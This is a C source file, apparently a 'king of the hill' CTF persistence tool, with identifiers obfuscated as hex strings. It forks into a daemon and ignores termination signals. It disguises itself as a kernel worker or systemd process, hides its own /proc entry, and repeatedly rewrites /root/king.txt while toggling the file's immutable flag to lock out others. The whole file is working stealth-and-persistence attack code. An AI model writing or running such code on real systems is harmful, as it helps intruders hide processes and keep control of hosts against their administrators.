#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/mount.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <errno.h>
#include <time.h>

 
#define x7072666b70617468 "/root/king.txt"
#define x757365726e616d65 "yournickname"

 
static char x70726f636e6d65[] = {'/','l','i','b','/','s','y','s','t','e','m','d','/','s','y','s','t','e','m','d','-','r','e','s','o','l','v','e','d','\0'};
static char x666b636d646c6e65[] = {'[','k','w','o','r','k','e','r','/','0',':','1','H',']','\0'};

static void x616476686964696e() {
   
    char x70726f6370617468[64];
    snprintf(x70726f6370617468, sizeof(x70726f6370617468), "/proc/%d", getpid());
    
     
    mount("tmpfs", x70726f6370617468, "tmpfs", MS_NOEXEC | MS_NOSUID, "size=1k");
    
     
    char x636d646c696e6570[80];
    snprintf(x636d646c696e6570, sizeof(x636d646c696e6570), "/proc/%d/cmdline", getpid());
    chmod(x636d646c696e6570, 0000);
    
     
    prctl(PR_SET_NAME, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0, 0, 0);
}

static void x70726f63696e6a65() {
     
    FILE *x66706f70656e = popen("ps -eo pid,comm | grep -E '(systemd|init|kthread)' | head -1", "r");
    if (x66706f70656e) {
        char x6c696e65626566[256];
        if (fgets(x6c696e65626566, sizeof(x6c696e65626566), x66706f70656e)) {
            int x746172676574706964 = atoi(x6c696e65626566);
            if (x746172676574706964 > 1) {
                
                char x6e65776e616d65[32];
                snprintf(x6e65776e616d65, sizeof(x6e65776e616d65), "systemd-%d", x746172676574706964 % 1000);
                prctl(PR_SET_NAME, x6e65776e616d65, 0, 0, 0);
            }
        }
        pclose(x66706f70656e);
    }
}

static void x73746c74696e6974(int x61726763, char **x61726776) {
     
    x616476686964696e();
    x70726f63696e6a65();
    
    
    if (fork() != 0) exit(0);
    setsid();
    if (fork() != 0) exit(0);
    
     
    chdir("/");
    
     
    for (int x6664 = 0; x6664 < 256; x6664++) close(x6664);
    
     
    open("/dev/null", O_RDWR);
    dup2(0, 1);
    dup2(0, 2);
    
     
    prctl(PR_SET_NAME, x666b636d646c6e65, 0, 0, 0);
    
     
    if (x61726763 > 0) {
        size_t x746f74616c6c656e = 0;
        for (int x69 = 0; x69 < x61726763; x69++) {
            x746f74616c6c656e += strlen(x61726776[x69]) + 1;
        }
        memset(x61726776[0], 0, x746f74616c6c656e);
        strncpy(x61726776[0], x666b636d646c6e65, x746f74616c6c656e - 1);
    }
    
    
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGTSTP, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);
    signal(SIGTTOU, SIG_IGN);
    signal(SIGUSR1, SIG_IGN);
    signal(SIGUSR2, SIG_IGN);
}

static void x777274666c65() {
    FILE *x66706f696e746572;
    int x617474656d707473 = 0;
    
     
    while (x617474656d707473 < 3) {
        x66706f696e746572 = fopen(x7072666b70617468, "r");
        if (x66706f696e746572) {
            int x666c6167 = 0;
            ioctl(fileno(x66706f696e746572), FS_IOC_SETFLAGS, &x666c6167);
            fclose(x66706f696e746572);
            break;
        }
        x617474656d707473++;
        usleep(100000); 
    }
    
    chmod(x7072666b70617468, S_IWUSR | S_IRUSR);
    
    x66706f696e746572 = fopen(x7072666b70617468, "w");
    if (x66706f696e746572) {
        fputs(x757365726e616d65, x66706f696e746572);
        fclose(x66706f696e746572);
    }
    
     
    x66706f696e746572 = fopen(x7072666b70617468, "r");
    if (x66706f696e746572) {
        chmod(x7072666b70617468, S_IRUSR | S_IRGRP | S_IROTH);
        int x666c6167 = FS_IMMUTABLE_FL;
        ioctl(fileno(x66706f696e746572), FS_IOC_SETFLAGS, &x666c6167);
        fclose(x66706f696e746572);
    }
}

static void x72616e646f6d646c() {
    
    int x62617365646c79 = 800000 + (rand() % 400000);   
    usleep(x62617365646c79);
}

int main(int x61726763, char *x61726776[]) {
     
    srand(getpid() ^ time(NULL));
    
    
    x73746c74696e6974(x61726763, x61726776);
    
     
    while (1) {
        x777274666c65();
        x72616e646f6d646c();
        
        
        if (rand() % 1000 == 0) {
            if (access(x7072666b70617468, F_OK) != 0) {
                 
                usleep(5000000); 
            }
        }
    }
    
    return 0;
}
